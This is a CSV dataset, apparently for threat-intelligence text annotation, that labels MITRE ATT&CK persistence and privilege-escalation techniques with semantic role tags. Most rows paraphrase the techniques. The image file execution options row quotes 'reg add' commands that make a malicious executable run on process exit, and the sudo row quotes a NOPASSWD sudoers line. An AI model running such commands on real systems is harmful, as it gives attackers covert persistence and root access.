0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,30,"persistence,privilege escalation ",appinit dlls,t1103,loaded and run,"registry keys  ,  dll","hkey_local_machine\software\microsoft\windows nt\currentversion\windowsor , hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows <attribute> are <what> loaded <\what> by <how> user32.dll <\how> into every process that loads user32.dll.in practice this is nearly every program, since user32.dll is a very common library. [1]similar to <tech> process injection <\tech>, these values <where> registry key values <\where> can be <what> abused/use <\what> to <why> obtain persistence and privilege escalation <\why> by <how> causing a <attribute> malicious",,,,,,,,,,,,,
,,,325,"persistence,privilege escalation ",launch daemon,t1160,install,launch daemon,,executed under root privileges,,,execute at startup  load a plist into the appropriate directories,,,launchd or launchctl,,,,,,
,,,326,"persistence,privilege escalation ",launch daemon,t1160,use,service,,,,,escalate privileges from administrator to root,,,,,,,,,
,,,272,"persistence,privilege escalation ",hooking,t1179,redirecting,api function calls,,,,,"in response to events such as messages, keystrokes, and mouse inputs redirect code flow",,,"hooks procedures, which <what> intercept <\what> and <what> execute <\what> designated <where> code <\where>  import address table (iat) hooking, which use <what> modifications <\what> to a <where> process’s iat <\where>  inline hooking, which <what> overwrites <\what> the <where> first bytes <\where> in an api function","intercept  ,  execute  ,  modifications  ,  overwrites","code  ,  process’s iat  ,  first bytes",,,,
,,,273,"persistence,privilege escalation ",hooking,t1179,use,hooking,,,,,<what> load and execute <\what> malicious <where> code <\where>  <what> masking <\what> the <where> execution <\where>,"load and execute  ,  masking","code  ,  execution",,,,,,,
,,,173,"persistence,privilege escalation,credential access ",dll search order hijacking,t1038,preloading,dll,binary-planting-attacks,,,,gain privilege escalation and persistence,,,placing a malicious dll with the same name,,,,,,
,,,174,"persistence,privilege escalation,credential access ",dll search order hijacking,t1038,use,remote preloading ,,,,,load a different dll to maintain persistence or privilege escalation,load,malicious dll,"replacing an existing dll  modifying a .manifest or .local redirection file, directory, or junction",,,,,,
,,,174,"persistence,privilege escalation,credential access ",dll search order hijacking,t1038,modify,program loading,,,,,,,,,,,,,,
,,,274,"persistence,privilege escalation,credential access ",hooking,t1179,installing,hooking mechanisms,,,,,persistence via continuous invocation,,,,,,,,,
,,,275,"persistence,privilege escalation,credential access ",hooking,t1179,use,hooking,,,,,<what> capture <\what> <where> api calls <\where>,capture,api calls,,,,,,,
,,,276,"persistence,privilege escalation,credential access ",hooking,t1179,reveal,user authentication credentials,,,,,credential access,,,,,,,,,
,,,277,"persistence,privilege escalation,credential access ",hooking,t1179,use,hooking,,,,,"conceal files, processes, registry keys, and other objects in order to hide malware and associated behaviors",,,by rootkits,,,,,,
,,,175,"persistence,privilege escalation,defense evasion ",dll search order hijacking,t1038,loaded,adversary-controlled dll,higher level,,,,privilege escalation,,,,,,,,,
,,,190,"persistence,privilege escalation,defense evasion ",dylib hijacking,t1157,plant/place/use,dylibs,,,,,gain privilege escalation or persistence,,,,,,,,,
,,,191,"persistence,privilege escalation,defense evasion ",dylib hijacking,t1157,plant/inject,malicious version dylibs,,run at a higher privilege level  the dylib is loaded,,,,,,,,,,,,
,,,279,"persistence,privilege escalation,defense evasion ",image file execution options injection,t1183,abuse/use,registry key values,,,,,obtain persistence and privilege escalation,,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe /v globalflag /t reg_dword /d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v reportingmode /t reg_dword /d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v monitorprocess /d c:\temp\evil.exe causing a malicious executable to be loaded and run,,,,,,
,,,280,"persistence,privilege escalation,defense evasion ",image file execution options injection,t1183,installing,ifeo mechanisms,,,,,persistence via continuous invocation,,,,,,,,,
,,,281,"persistence,privilege escalation,defense evasion ",image file execution options injection,t1183,use,ifeo,,,,,defense evasion,,,registering invalid debuggers that redirect and effectively disable various system and security applications,,,,,,
,,,220,privilege escalation ,exploitation for privilege escalation,t1068,use/abuse/takes advantage,programming error,"program, service  ,  operating system software  ,  kernel",,,,<what> execute <\what> <where> adversary-controlled code <\where>,execute,adversary-controlled code,,,,,,,
,,,221,privilege escalation ,exploitation for privilege escalation,t1068,perform,privilege escalation,software exploitation,initially gaining access to a system,,,<what> circumvent <\what> those <where> restrictions <\where>,circumvent,restrictions,,,,,,,
,,,222,privilege escalation ,exploitation for privilege escalation,t1068,operating,process,lower privileged,,,,,,,,,,,,,
,,,223,privilege escalation ,exploitation for privilege escalation,t1068,exploited,vulnerabilities,,,,,gain higher levels of access on the system,,,,,,,,,
,,,224,privilege escalation ,exploitation for privilege escalation,t1068,compromising,system,endpoint,,,,,,,,,,,,,
,,,192,privilege escalation ,dylib hijacking,t1157,run,dylib,elevated level,,,,privilege escalation technique,,,,,,,,,
,,,666,privilege escalation ,sudo,t1169,use,sudoers file configuration,,must have <condition>elevated <object>privileges<\object><\condition> to edit this file,elevated <object>privileges<\object>,privileges,"<what>execute<\what> <where>commands<\where> as other users , <what>spawn<\what> <where>processes<\where> with higher privileges","execute , spawn","commands , processes",line like user1 all=(all) nopasswd: all,,,,,,
,,,602,privilege escalation ,sid-history injection,t1178,use,sid-history injection,,domain administrator (or equivalent) rights,,,privilege escalation,,,,,,,,,
,,,603,privilege escalation ,sid-history injection,t1178,insert sid value,sid history,,,,,"<what>enable impersonation<\what>  of arbitrary <where>users<\where>/<where>groups<\where> , elevated access to local resources",enable impersonation,"users , groups",,,,,,,
,,,667,privilege escalation ,sudo caching,t1206,use,configuration,,"/var/db/sudo's timestamp can be monitored to see if it <condition>falls within the <object>timestamp_timeout<\object> range<\condition> , <condition> <object>tty_tickets<\object> is disabled<\condition>","falls within the <object>timestamp_timeout<\object> range ,  <object>tty_tickets<\object> is disabled","timestamp_timeout , tty_tickets",<what>escalate<\what> <where>privileges<\where> without needing the user's password,escalate,privileges,,,,,,,
,,,668,privilege escalation ,sudo caching,t1206,disable,tty_ticket,,proton malware also must <condition>issue killall terminal<\condition>,issue killall terminal,,<what>make<\what> <where>scripting<\where> easier,make,scripting,,,,,,,
,,,79,"privilege escalation,defense evasion ",bypass user account control,t1088,injected,malicious software,,,,,gain elevated privileges,,,,,,,,,
,,,80,"privilege escalation,defense evasion ",bypass user account control,t1088,"use  ,  auto-elevate  ,  execute",binary or script,,target process is unprotected,,,elevate privileges to administrator,,,uacme  eventvwr.exe,,,,,,
,,,81,"privilege escalation,defense evasion ",bypass user account control,t1088,bypass,user account control,,<object> credentials<\object> for an account with <condition> administrator privileges are known<\condition>,administrator privileges are known,credentials,,,,lateral movement,,,,,,
,,,232,"privilege escalation,defense evasion ",extra window memory injection,t1181,utilize/use,memory location,,,,,attack chain,,,,,,,,,
,,,233,"privilege escalation,defense evasion ",extra window memory injection,t1181,writing,code,,,,,,,,,,,,,,
,,,234,"privilege escalation,defense evasion ",extra window memory injection,t1181,placing,pointer,code,,,,,,,,,,,,,
,,,235,"privilege escalation,defense evasion ",extra window memory injection,t1181,invoking,execution,,,,,,,,<what>returning <\what><where> execution  control <\where> to the address in the process’s ewm,returning,execution  control,,,,
,,,236,"privilege escalation,defense evasion ",extra window memory injection,t1181,bypass,protection mechanisms,data execution prevention (dep),,,,,,,triggering a combination of windows procedures  and other system functions,,,,,,
,,,237,"privilege escalation,defense evasion ",extra window memory injection,t1181,rewrite,malicious payload,,,,,,,,,,,,,,
,,,588,"privilege escalation,persistence",service registry permissions weakness,t1058,change,service binpath,,"<condition><object>permissions<\object> for users and groups are not properly set<\condition> , <condition>allow access to the <object>registry keys<\object><\condition> for a service","<object>permissions<\object> for users and groups are not properly set , allow access to the <object>registry keys<\object>","permissions , registry keys","<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence",,,,,,,
,,,589,"privilege escalation,persistence",service registry permissions weakness,t1058,alter,imagepath,,,,,"<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence",,,,,,,
,,,590,"privilege escalation,persistence",service registry permissions weakness,t1058,alter,registry key,service failure parameters,,,,"<what>point<\what> to a different <where>executable<\where>  , <what>gain<\what>persistence , privilege escalation","point , gain","executable,persistence",,,,,,,
,1,,591,"privilege escalation,persistence",setuid and setgid,t1166,use, setuid and setgid bits/setsuid flag,,,,,get <where>code<\where> <what>running<\what> in a different user context; do  shell escape; exploit  vulnerability ,running,code,setsuid or setgid bits,,,,,,
,,,591,"persistence, privilege escalation",application shimming,t1138,use,hooking,shim database,,,,,,,,,,,,,
,,,591,"persistence, privilege escalation",application shimming,t1138,bypass,user account control (uac),,,,,,,,,,,,,,
,,,591,"persistence, privilege escalation",application shimming,t1138,inject,dlls,into process,,,,,,,,,,,,,
,,,591,"persistence, privilege escalation",application shimming,t1138,disable,data execution prevention,,,,,,,,,,,,,,
